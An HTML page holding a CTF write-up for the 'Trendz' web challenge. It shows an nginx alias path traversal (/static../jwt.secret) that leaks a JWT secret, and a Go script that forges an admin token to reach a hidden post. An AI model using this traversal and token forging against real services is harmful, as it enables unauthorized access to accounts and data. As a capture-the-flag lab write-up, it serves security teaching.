<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CyberSpace24 - Trendz | hxuu</title>
<meta name=keywords content="ctf,write-up,cyberspace"><meta name=description content="CTF write-up for Trendz"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/cyberspace24/trendz/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/cyberspace24/trendz/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/cyberspace24/trendz/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="CyberSpace24 - Trendz"><meta property="og:description" content="CTF write-up for Trendz"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2024-09-02T11:51:43+01:00"><meta property="article:modified_time" content="2024-09-02T11:51:43+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Cyberspace"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="CyberSpace24 - Trendz"><meta name=twitter:description content="CTF write-up for Trendz"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"CyberSpace24 - Trendz","item":"https://hxuu.github.io/blog/ctf/cyberspace24/trendz/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CyberSpace24 - Trendz","name":"CyberSpace24 - Trendz","description":"CTF write-up for Trendz","keywords":["ctf","write-up","cyberspace"],"articleBody":"Challenge Description n c p s a a o o m t i l e e n v : g t e o s s t r : : r y e : 3 5 n 8 2 d w 3 z e b e x p l o i t a t i o n The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\nNote: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you’ve completed this initial task, and will be released in Wave 3.\nThe JWT_SECRET_KEY environment variable given in the handout is just a placeholder, and not the actual value set on remote.\nAnalysis We’re given the following web page (after we login)\nWe can create posts and view them. Following what the description says, our job is to view this hidden post, luckily for us, we’re given the source code here\n. ├── Dockerfile ├── go.mod ├── go.sum ├── handlers │ ├── custom │ │ └── Custom.go │ ├── dashboard │ │ ├── AdminDash.go │ │ ├── SuperAdminDash.go │ │ └── UserDash.go │ ├── db │ │ └── Init.go │ ├── jwt │ │ └── JWTAuth.go │ └── service │ ├── CreateUser.go │ ├── JWTHandler.go │ ├── LoginUser.go │ ├── Posts.go │ └── ValidateAdmin.go ├── init.sql ├── jwt.secret ├── main.go ├── nginx.conf ├── readme.md ├── run.sh ├── static │ ├── css │ │ ├── admin.css │ │ ├── bootstrap.min.css │ │ ├── style.css │ │ └── user.css │ ├── index.html │ └── js │ ├── client-side-templates.js │ ├── htmx.min.js │ ├── json-enc.js │ └── nunjucks.min.js └── templates ├── adminDash.tmpl ├── login.tmpl ├── main.tmpl ├── register.tmpl ├── superAdminDash.tmpl ├── userDash.tmpl └── viewPost.tmpl It’s a Go application, let’s check the Dockerfile\nDockerfile FROM golang:alpine AS builder RUN apk update \u0026\u0026 apk add --no-cache git WORKDIR /app COPY go.mod go.sum ./ RUN go mod download COPY . . ENV GIN_MODE=release ENV PORT=8000 RUN go build -o /app/chall FROM postgres:alpine RUN apk update \u0026\u0026 apk add --no-cache nginx COPY nginx.conf /etc/nginx/nginx.conf COPY run.sh /usr/local/bin/run.sh COPY init.sql /docker-entrypoint-initdb.d/init.sql WORKDIR /app COPY --from=builder /app/chall /app/chall COPY static static COPY templates templates ENTRYPOINT [\"sh\", \"/usr/local/bin/run.sh\"] This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.\nThe run.sh script is the entrypoint of the application. Let’s check that:\nrun.sh #!/bin/env sh cat /dev/urandom | head | sha1sum | cut -d \" \" -f 1 \u003e /app/jwt.secret export JWT_SECRET_KEY=notsosecurekey export ADMIN_FLAG=CSCTF{flag1} export POST_FLAG=CSCTF{flag2} export SUPERADMIN_FLAG=CSCTF{flag3} export REV_FLAG=CSCTF{flag4} export POSTGRES_USER=postgres export POSTGRES_PASSWORD=mysecretpassword export POSTGRES_DB=devdb uuid=$(cat /proc/sys/kernel/random/uuid) user=$(cat /dev/urandom | head | md5sum | cut -d \" \" -f 1) cat \u003c\u003c EOF \u003e\u003e /docker-entrypoint-initdb.d/init.sql INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin'); INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG'); EOF docker-ensure-initdb.sh \u0026 GIN_MODE=release /app/chall \u0026 sleep 5 su postgres -c \"postgres -D /var/lib/postgresql/data\" \u0026 nginx -g 'daemon off;' This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.\nSince the actual challenge consists of 4 independent parts (trend[number-of-z]), we can deduce based on the challenge name, that the flag we’re looking for is ADMIN_FLAG.\nLet’s search in the codebase to see where this flag is mentioned.\nNote: you can check the source code of the application alone, since the code base is a bit bigger than what a writeup could handle, I’ll entrust the process of understanding the api to you.\nSearching for the keyword, we get one occurrence in handlers/dashboard/AdminDash.go, more specifically in the AdminDashboard function that looks like this:\nfunc AdminDashboard(ctx *gin.Context) { posts := service.GetAllPosts() ctx.HTML(200, \"adminDash.tmpl\", gin.H{ \"flag\": os.Getenv(\"ADMIN_FLAG\"), \"posts\": posts, }) } If we are admin, we can view all the posts, among which is the desired post which contains the flag.\nHowever, we have a problem, we’re mere users, how can we change our role to admin.\nThe application uses JWT tokens for access control. It uses accessToken only to validate admins.\nLet’s dive deeper into the codebase, where is the AdminDashboard mentioned again?\nOne occurence in the main.go script under the admin group. To access the admin dashboard, we first have to validate the access token, then we have to validate the admin. Let’s check the code for both:\nJWTAuth.go func ValidateAccessToken(encodedToken string) (*jwt.Token, error) { return jwt.Parse(encodedToken, func(token *jwt.Token) (interface{}, error) { _, isValid := token.Method.(*jwt.SigningMethodHMAC) if !isValid { return nil, fmt.Errorf(\"invalid token with signing method: %v\", token.Header[\"alg\"]) } return []byte(secretKey), nil }) } This Go function validates a JWT by parsing it and checking the signing method. It ensures the token uses HMAC signing and verifies it with a secret key. If the signing method is incorrect, it returns an error.\nThe secret key is found in the jwt.secret a the root of the application. Seeems we needs to retrieve that hmmm…\nOkay, Let’s check the admin validation code:\nValidateAdmin.go func ValidateAdmin() gin.HandlerFunc { return func(c *gin.Context) { const bearerSchema = \"Bearer \" var tokenDetected bool = false var tokenString string authHeader := c.GetHeader(\"Authorization\") if len(authHeader) != 0 { tokenDetected = true tokenString = authHeader[len(bearerSchema):] } if !tokenDetected { var err error tokenString, err = c.Cookie(\"accesstoken\") if tokenString == \"\" || err != nil { c.Redirect(302, \"/getAccessToken?redirect=\"+c.Request.URL.Path) } } fmt.Println(tokenString) claims := jwt.ExtractClaims(tokenString) if claims[\"role\"] == \"admin\" || claims[\"role\"] == \"superadmin\" { fmt.Println(claims) } else { fmt.Println(\"Token is not valid\") c.AbortWithStatusJSON(403, gin.H{\"error\": \"User Unauthorized\"}) return } } } This Go function is a Gin middleware that checks if the request has a valid JWT token with an “admin” or “superadmin” role. It first looks for the token in the “Authorization” header or a cookie. If not found or invalid, it redirects the user to obtain an access token or returns a 403 Unauthorized error.\nInteresting, if we can craft our own valid JWT token, with role admin (or superadmin, but that’s for another challenge), we can access the admin dashboard, from which we can retrieve the hidden post that has the flag.\nExploitation You should note, that without the jwt.secret contents, we can’t do anything.\nWe are not given a custom nginx configuration for nothing though, if we check the config\nuser nobody; worker_processes auto; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { proxy_pass http://localhost:8000; } location /static { alias /app/static/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } We can see that /static is aliased to /app/static/, with no restriction for which files we can access (including jwt.secret), thus enabling us to navigate to /static../jwt.secret, which is aliased to /app/static/../jwt.secret, that is the secret key used to sign the JWT token.\nGreat! we got the key. Now let’s craft our valid JWT token using the following script\npackage main import ( \"fmt\" \"os\" \"time\" \"github.com/golang-jwt/jwt/v5\" ) var secretKey = []byte{} func InitJWT() { key, err := os.ReadFile(\"jwt.secret\") if err != nil { panic(err) } secretKey = key[:] } func GenerateAccessToken(username string, role string) (string, error) { token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ \"username\": username, \"exp\": time.Now().Add(time.Minute * 10).Unix(), \"role\": role, \"iat\": time.Now().Unix(), }) signedToken, err := token.SignedString(secretKey) if err != nil { signedToken = \"\" } return signedToken, err } func main() { InitJWT() token, err := GenerateAccessToken(\"hxuu\", \"admin\") if err != nil { fmt.Println(\"Error generating token:\", err) return } fmt.Println(\"Generated Token:\", token) } jwt.secret is the file we downloaded previously.\nRunning the script gives us a valid JWT Token.\nNow we just have to login as user hxuu, replace the accesstoken in the cookies with our token, and access /admin/dashboard.\nAwesome, we can see the wanted post id. Let’s access it using /user/posts/\nAnd there we go~ Flag is: CSCTF{0a97afb3-64be-4d96-aa52-86a91a2a3c52}\nLessons learned from this challenge:\nJWT Secret Key Exposure: Ensuring sensitive files like JWT secrets are not publicly accessible is crucial to prevent unauthorized access. Token Crafting: Crafting a valid JWT token can allow you to bypass access controls if the secret key is known. Nginx Configuration: Be aware of Nginx configurations that could expose sensitive files through aliases or improper restrictions. Access Control: Properly validate and handle user roles and permissions to secure admin and sensitive functionalities. ","wordCount":"1461","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-09-02T11:51:43+01:00","dateModified":"2024-09-02T11:51:43+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/cyberspace24/trendz/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">CyberSpace24 - Trendz</h1><div class=post-description>CTF write-up for Trendz</div><div class=post-meta><span title='2024-09-02 11:51:43 +0100 +0100'>September 2, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/cyberspace24/trendz.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#dockerfile><code>Dockerfile</code></a></li><li><a href=#runsh><code>run.sh</code></a></li><li><a href=#jwtauthgo><code>JWTAuth.go</code></a></li><li><a href=#validateadmingo><code>ValidateAdmin.go</code></a></li></ul></li><li><a href=#exploitation>Exploitation</a></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-description>Challenge Description<a hidden class=anchor aria-hidden=true href=#challenge-description>#</a></h2><div class="goat svg-container"><svg font-family="Menlo,Lucida Console,monospace" viewBox="0 0 216 73"><g transform="translate(8,16)"><text text-anchor="middle" x="0" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="0" y="20" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="0" y="36" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="0" y="52" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="8" y="4" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="8" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="8" y="36" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="8" y="52" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="16" y="4" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="16" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="16" y="36" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="16" y="52" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="24" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="36" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="24" y="52" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="32" y="4" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="32" y="20" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="32" y="36" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="32" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="40" y="36" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="52" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="48" y="4" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="48" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="48" y="36" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="48" y="52" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="56" y="4" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="56" y="20" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="64" y="4" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="64" y="20" fill="currentcolor" style="font-size:1em">:</text><text text-anchor="middle" x="64" y="36" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="64" y="52" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="72" y="4" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="72" y="36" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="72" y="52" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="80" y="4" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="80" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="80" y="36" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="88" y="4" fill="currentcolor" style="font-size:1em">z</text><text text-anchor="middle" x="88" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="96" y="20" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="112" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="120" y="20" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="128" y="20" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="136" y="20" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="144" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="152" y="20" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="160" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="168" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="176" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="184" y="20" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="192" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="200" y="20" fill="currentcolor" style="font-size:1em">n</text></g></svg></div><p>The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.</p><blockquote><p>Note: This challenge consists of four parts, which can be solved in any order. However, the final part will only be accessible once you&rsquo;ve completed this initial task, and will be released in Wave 3.</p></blockquote><blockquote><p>The JWT_SECRET_KEY environment variable given in the handout is just a placeholder, and not the actual value set on remote.</p></blockquote><h2 id=analysis>Analysis<a hidden class=anchor aria-hidden=true href=#analysis>#</a></h2><p>We&rsquo;re given the following web page (after we login)</p><p><img alt=functionality loading=lazy src=/blog/images/2024-09-02-11-15-54.png></p><p>We can create posts and view them. Following what the description says, our job is to view
this hidden post, luckily for us, we&rsquo;re given the source code <a href="https://2024.csc.tf/files/b8af02ac0f411268b239e62fd2c6e7dd/handout_trendz.zip?token=eyJ1c2VyX2lkIjo4MDEsInRlYW1faWQiOjQwMCwiZmlsZV9pZCI6NTB9.ZtWjAA.MI0GGzruP8zhlBfSGxRmioVo8zQ">here</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Dockerfile
</span></span><span class=line><span class=cl>├── go.mod
</span></span><span class=line><span class=cl>├── go.sum
</span></span><span class=line><span class=cl>├── handlers
</span></span><span class=line><span class=cl>│   ├── custom
</span></span><span class=line><span class=cl>│   │   └── Custom.go
</span></span><span class=line><span class=cl>│   ├── dashboard
</span></span><span class=line><span class=cl>│   │   ├── AdminDash.go
</span></span><span class=line><span class=cl>│   │   ├── SuperAdminDash.go
</span></span><span class=line><span class=cl>│   │   └── UserDash.go
</span></span><span class=line><span class=cl>│   ├── db
</span></span><span class=line><span class=cl>│   │   └── Init.go
</span></span><span class=line><span class=cl>│   ├── jwt
</span></span><span class=line><span class=cl>│   │   └── JWTAuth.go
</span></span><span class=line><span class=cl>│   └── service
</span></span><span class=line><span class=cl>│       ├── CreateUser.go
</span></span><span class=line><span class=cl>│       ├── JWTHandler.go
</span></span><span class=line><span class=cl>│       ├── LoginUser.go
</span></span><span class=line><span class=cl>│       ├── Posts.go
</span></span><span class=line><span class=cl>│       └── ValidateAdmin.go
</span></span><span class=line><span class=cl>├── init.sql
</span></span><span class=line><span class=cl>├── jwt.secret
</span></span><span class=line><span class=cl>├── main.go
</span></span><span class=line><span class=cl>├── nginx.conf
</span></span><span class=line><span class=cl>├── readme.md
</span></span><span class=line><span class=cl>├── run.sh
</span></span><span class=line><span class=cl>├── static
</span></span><span class=line><span class=cl>│   ├── css
</span></span><span class=line><span class=cl>│   │   ├── admin.css
</span></span><span class=line><span class=cl>│   │   ├── bootstrap.min.css
</span></span><span class=line><span class=cl>│   │   ├── style.css
</span></span><span class=line><span class=cl>│   │   └── user.css
</span></span><span class=line><span class=cl>│   ├── index.html
</span></span><span class=line><span class=cl>│   └── js
</span></span><span class=line><span class=cl>│       ├── client-side-templates.js
</span></span><span class=line><span class=cl>│       ├── htmx.min.js
</span></span><span class=line><span class=cl>│       ├── json-enc.js
</span></span><span class=line><span class=cl>│       └── nunjucks.min.js
</span></span><span class=line><span class=cl>└── templates
</span></span><span class=line><span class=cl>    ├── adminDash.tmpl
</span></span><span class=line><span class=cl>    ├── login.tmpl
</span></span><span class=line><span class=cl>    ├── main.tmpl
</span></span><span class=line><span class=cl>    ├── register.tmpl
</span></span><span class=line><span class=cl>    ├── superAdminDash.tmpl
</span></span><span class=line><span class=cl>    ├── userDash.tmpl
</span></span><span class=line><span class=cl>    └── viewPost.tmpl
</span></span></code></pre></div><p>It&rsquo;s a Go application, let&rsquo;s check the Dockerfile</p><h3 id=dockerfile><code>Dockerfile</code><a hidden class=anchor aria-hidden=true href=#dockerfile>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> golang:alpine AS builder</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apk update <span class=o>&amp;&amp;</span> apk add --no-cache git<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> go.mod go.sum ./<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> go mod download<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> . .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>GIN_MODE</span><span class=o>=</span>release
</span></span><span class=line><span class=cl><span class=k>ENV</span> <span class=nv>PORT</span><span class=o>=</span><span class=m>8000</span>
</span></span><span class=line><span class=cl><span class=k>RUN</span> go build -o /app/chall<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>FROM</span><span class=s> postgres:alpine</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apk update <span class=o>&amp;&amp;</span> apk add --no-cache nginx<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> nginx.conf /etc/nginx/nginx.conf<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> run.sh /usr/local/bin/run.sh<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> init.sql /docker-entrypoint-initdb.d/init.sql<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> --from<span class=o>=</span>builder /app/chall /app/chall<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> static static<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> templates templates<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENTRYPOINT</span> <span class=p>[</span><span class=s2>&#34;sh&#34;</span><span class=p>,</span> <span class=s2>&#34;/usr/local/bin/run.sh&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></div><p>This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.</p><p>The <code>run.sh</code> script is the entrypoint of the application. Let&rsquo;s check that:</p><h3 id=runsh><code>run.sh</code><a hidden class=anchor aria-hidden=true href=#runsh>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/env sh
</span></span></span><span class=line><span class=cl><span class=cp></span>cat /dev/urandom <span class=p>|</span> head <span class=p>|</span> sha1sum <span class=p>|</span> cut -d <span class=s2>&#34; &#34;</span> -f <span class=m>1</span> &gt; /app/jwt.secret
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>JWT_SECRET_KEY</span><span class=o>=</span>notsosecurekey
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>ADMIN_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag1<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POST_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag2<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SUPERADMIN_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag3<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>REV_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag4<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_USER</span><span class=o>=</span>postgres
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_PASSWORD</span><span class=o>=</span>mysecretpassword
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_DB</span><span class=o>=</span>devdb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>uuid</span><span class=o>=</span><span class=k>$(</span>cat /proc/sys/kernel/random/uuid<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>user</span><span class=o>=</span><span class=k>$(</span>cat /dev/urandom <span class=p>|</span> head <span class=p>|</span> md5sum <span class=p>|</span> cut -d <span class=s2>&#34; &#34;</span> -f 1<span class=k>)</span>
</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt; EOF &gt;&gt; /docker-entrypoint-initdb.d/init.sql
</span></span></span><span class=line><span class=cl><span class=s>	INSERT INTO users (username, password, role) VALUES (&#39;superadmin&#39;, &#39;superadmin&#39;, &#39;superadmin&#39;);
</span></span></span><span class=line><span class=cl><span class=s>    INSERT INTO posts (postid, username, title, data) VALUES (&#39;$uuid&#39;, &#39;$user&#39;, &#39;Welcome to the CTF!&#39;, &#39;$ADMIN_FLAG&#39;);
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker-ensure-initdb.sh <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=nv>GIN_MODE</span><span class=o>=</span>release /app/chall <span class=p>&amp;</span> sleep <span class=m>5</span>
</span></span><span class=line><span class=cl>su postgres -c <span class=s2>&#34;postgres -D /var/lib/postgresql/data&#34;</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nginx -g <span class=s1>&#39;daemon off;&#39;</span>
